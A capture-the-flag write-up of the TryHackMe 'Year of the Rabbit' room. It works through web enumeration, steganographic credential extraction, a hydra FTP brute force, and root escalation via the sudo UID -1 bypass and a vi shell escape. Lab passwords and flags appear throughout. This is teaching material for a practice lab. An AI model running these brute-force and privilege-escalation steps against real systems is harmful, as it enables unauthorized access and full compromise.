# TryHackMe – Year of the Rabbit Write-up
Author: Vinay Trivedi  
Platform: TryHackMe  
Room: Year of the Rabbit  
Difficulty: Medium  

---

# Overview

This machine demonstrates a full attack chain including:

- Web enumeration
- HTTP header inspection
- User-Agent filtering bypass
- File analysis & steganography
- FTP exploitation
- Brainfuck decoding
- SSH foothold
- Privilege escalation
- Sudo misconfiguration exploitation

This write-up documents **every step including failed attempts and thought process**, replicating the real penetration testing workflow.

---

# Initial Reconnaissance

The first step was scanning the machine using Nmap.

```bash
nmap -sC -sV -A 10.113.136.98
```

## Result

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian
80/tcp open  http    Apache httpd 2.4.10
```

### Observations

Three services are exposed:

| Port | Service |
|-----|------|
|21|FTP|
|22|SSH|
|80|HTTP|

Since a web server exists, the next step was **web enumeration**.

---

# Web Enumeration

Opening the IP address in the browser displayed the **Apache default page**.

Next step was directory enumeration.

```bash
gobuster dir -u http://10.113.136.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

## Result

```
/assets
```

---

# Inspecting /assets

Visiting:

```
http://10.113.136.98/assets
```

revealed:

```
RickRolled.mp4
style.css
```

Opening **style.css** revealed an interesting comment.

```css
/* Nice to see someone checking the stylesheet.
Take a look at the page: /sup3r_s3cr3t_fl4g.php */
```

---

# First Rabbit Hole

Visiting:

```
/sup3r_s3cr3t_fl4g.php
```

redirected to a **Rick Astley YouTube video**.

Initially this seemed like trolling, but further inspection revealed it was actually a hint.

---

# Inspecting HTTP Headers

Using curl:

```bash
curl -v http://10.113.136.98/sup3r_s3cr3t_fl4g.php
```

Important header:

```
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
```

This revealed the hidden directory:

```
/WExYY2Cv-qU
```

---

# Accessing Hidden Directory

Attempting to visit the directory normally still redirected.

The page hinted that the issue was **User-Agent filtering**.

Using curl with a browser agent:

```bash
curl -A "Mozilla/5.0" http://10.113.136.98/WExYY2Cv-qU/
```

This revealed a directory listing.

```
Hot_Babe.png
```

---

# Image Analysis

Downloaded the image:

```bash
wget http://10.113.136.98/WExYY2Cv-qU/Hot_Babe.png
```

Checked metadata:

```bash
exiftool Hot_Babe.png
```

Output:

```
Warning : Trailer data after PNG IEND chunk
```

This suggested **hidden appended data**.

---

# Extracting Hidden Data

Running strings:

```bash
strings Hot_Babe.png
```

Important discovery:

```
Eh, you've earned this.
Username for FTP is ftpuser
One of these is the password
```

Followed by a **large list of passwords**.

---

# FTP Brute Force

Saved the password list to a file.

```bash
hydra -l ftpuser -P pass.txt ftp://10.113.136.98
```

Credentials discovered:

```
ftpuser : 5iez1wGXKfPKQ
```

---

# FTP Access

Logged in:

```bash
ftp 10.113.136.98
```

Files discovered:

```
Eli's_Creds.txt
```

Downloaded the file.

---

# Brainfuck Decoding

The file contained strange symbols:

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< ...
```

Recognized as **Brainfuck code**.

Decoded using an online interpreter.

Output:

```
User: eli
Password: DSpDiM1wAEwid
```

---

# SSH Foothold

Logged in via SSH.

```bash
ssh eli@10.113.136.98
```

Password:

```
DSpDiM1wAEwid
```

---

# Local Enumeration

Listing home directories:

```bash
ls /home
```

```
eli
gwendoline
```

Inside gwendoline's directory:

```
user.txt
```

But permissions prevented reading it.

---

# Failed Attempt

Tried switching user:

```bash
su gwendoline
```

Result:

```
Authentication failure
```

---

# Searching for Credentials

Searching the filesystem revealed:

```
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

Reading the file:

```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
```

This revealed the password.

---

# Switching User

```bash
su gwendoline
```

Password:

```
MniVCQVhQHUNI
```

---

# User Flag

```bash
cat user.txt
```

```
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Result:

```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Meaning:

- vi can be executed as any user
- except root

However this restriction can be bypassed.

---

# UID Trick

Using UID **-1**:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside vi:

```
:!/bin/bash
```

Spawned a root shell.

---

# Root Access

Verification:

```bash
id
```

```
uid=0(root) gid=0(root)
```

---

# Root Flag

```bash
cd /root
cat root.txt
```

```
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

---

# Complete Attack Chain

```
Web Enumeration
→ Hidden Directory Discovery
→ HTTP Header Analysis
→ User-Agent Bypass
→ Image Steganography
→ FTP Credentials
→ Brainfuck Decoding
→ SSH Foothold
→ Credential Leak
→ User Escalation
→ Sudo Misconfiguration
→ Root Access
```

---

# Key Lessons

### Web Enumeration
Always inspect source code and headers.

### File Analysis
Images can hide sensitive data.

### Encoding
Brainfuck and other encodings can hide credentials.

### Privilege Escalation
Misconfigured sudo rules are extremely dangerous.

### UID Bypass
Using `-1` can bypass root restrictions in some sudo configurations.

---

# Author

Vinay Trivedi  
Cybersecurity Enthusiast
